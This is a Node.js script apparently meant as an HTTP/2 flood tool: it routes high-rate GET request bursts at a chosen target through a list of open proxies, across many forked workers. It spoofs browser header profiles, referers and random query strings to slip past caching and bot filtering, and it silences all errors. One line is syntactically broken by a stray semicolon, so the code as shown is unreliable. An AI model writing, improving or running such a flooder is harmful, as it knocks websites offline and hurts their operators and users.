const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7){
    console.log(`node miorihttp.js [target] [time] [rate] [thread] [proxy] --extra --ref`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== "");
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    extra: process.argv.includes('--extra'),
    refFlag: process.argv.includes('--ref')
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

// --- ОБНОВЛЕННЫЙ БЛОК КОДА ---

const languages = [
    'en-US,en;q=0.9',
    'ru-RU,ru;q=0.8,en-US;q=0.7',
    'fr-FR,fr;q=0.9,en-US;q=0.8',
    'de-DE,de;q=0.9,en-US;q=0.7',
];

function randomElement(arr) {
    if (!arr || arr.length === 0) {
        throw new Error('Array is empty or undefined');
    }
    return arr[Math.floor(Math.random() * arr.length)];
}

function detectPlatformFromUA(ua) {
    if (ua.includes('Windows')) return '"Windows"';
    if (ua.includes('Macintosh') || ua.includes('Mac OS')) return '"macOS"';
    if (ua.includes('Linux')) return '"Linux"';
    if (ua.includes('Android')) return '"Android"';
    if (ua.includes('iPhone') || ua.includes('iPad')) return '"iOS"';
    return '"Unknown"';
}

const browserProfiles = [
    {
        name: "chrome",
        useragents: [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
        ],
        headers: (ua) => ({
            "user-agent": ua,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": randomElement(languages),
            "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "sec-ch-ua-mobile": ua.includes('Mobile') ? "?1" : "?0",
            "sec-ch-ua-platform": detectPlatformFromUA(ua),
            "sec-fetch-site": "none",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "upgrade-insecure-requests": "1"
        })
    },
    {
        name: "firefox",
        useragents: [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
            "Mozilla/5.0 (Android 14; Mobile; rv:135.0) Gecko/135.0 Firefox/135.0"
        ],
        headers: (ua) => ({
            "user-agent": ua,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "accept-language": randomElement(languages),
            "accept-encoding": "gzip, deflate, br, zstd",
            "upgrade-insecure-requests": "1",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none"
        })
    },
    {
        name: "safari",
        useragents: [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
        ],
        headers: (ua) => ({
            "user-agent": ua,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": randomElement(languages),
            "accept-encoding": "gzip, deflate, br",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none"
        })
    }
];

const headersCache = new Map();

function getRandomHeaders() {
    const profile = randomElement(browserProfiles);
    const ua = randomElement(profile.useragents);
    const key = `${profile.name}-${ua}`;
    
    if (headersCache.has(key)) {
        return { baseHeaders: headersCache.get(key), profileName: profile.name };
    }
    
    const headers = profile.headers(ua);
    headersCache.set(key, headers);
    return { baseHeaders: headers, profileName: profile.name };
}

// --- КОНЕЦ ОБНОВЛЕННОГО БЛОКА ---

const referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://yandex.ru/",
    "https://t.co/",
    parsedTarget.href
];

function buildHeaders() {
    const { baseHeaders, profileName } = getRandomHeaders();
    
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        ...baseHeaders
    };

    if (args.extra) {
        if (Math.random() > 0.5) headers["dnt"] = "1";
    }

    if (args.refFlag) {
        headers["referer"] = randomElement(referers) + randomString(5);
    }

    return headers;
}

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error");
            }
            return callback(connection, undefined);
        });

        connection.on("error", () => {
            connection.destroy();
        });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr) return;
    
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host,
        timeout: 10,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host
        };

        const tlsConn = tls.connect(tlsOptions);

        tlsConn.on('secureConnect', () => {
            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: {
                    maxConcurrentStreams: 100,
                    initialWindowSize: 65535,
                    enablePush: false,
                },
                createConnection: () => tlsConn
            });

            client.on("connect", () => {
                setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        const headers = buildHeaders();
                        const request = client.request(headers);
                        .on("response", response => {
                            request.close();
                            request.destroy();
                            return
                        });
                        request.end();
                    }
                }, 1000);
            });

            client.on("error", () => {
                client.destroy();
                connection.destroy();
                return
            });

            client.on("close", () => {
                client.destroy();
                connection.destroy();
                return
            });
        });
    });
}

setTimeout(() => process.exit(1), args.time * 1000);